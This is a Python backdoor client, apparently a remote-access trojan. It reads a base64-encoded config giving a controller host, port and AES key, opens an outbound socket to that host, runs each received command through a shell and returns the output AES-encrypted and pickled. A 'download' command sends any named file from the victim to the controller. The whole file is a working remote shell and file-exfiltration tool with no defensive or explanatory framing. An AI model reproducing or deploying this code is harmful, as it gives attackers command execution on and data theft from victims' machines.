#!/usr/bin/python

import socket, subprocess, sys, os
import pickle
from Crypto.Cipher import AES
import base64

BLOCK_SIZE = 64  # Bytes
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * \
                chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)

# READ CONFIG IN BASE 64
file = open("config", "r")
config = file.read()
config = base64.b64decode(config)
config = config.split(",")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((config[0], int(config[1])))

def do_encrypt(message):
    #obj = AES.new('This is a key123', AES.MODE_ECB)
    #ciphertext = obj.encrypt(message)
    raw = pad(message)
    obj = AES.new(config[2], AES.MODE_ECB)
    ciphertext = obj.encrypt(raw)
    return ciphertext


while True :
    command = s.recv(1024)
    if command == 'quit' :
        break
    if "download" in command:
        isFirst = False
        a = command.replace("download", "")
        a = a.replace(" ", "")
        f = open(a, 'rb')
        l = f.read(35000)
        s.send(l)
        f.close()


    else:
        reply = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout, stderr = reply.communicate()
        en_reply = do_encrypt(stdout)
        s.send(pickle.dumps(en_reply))

s.close()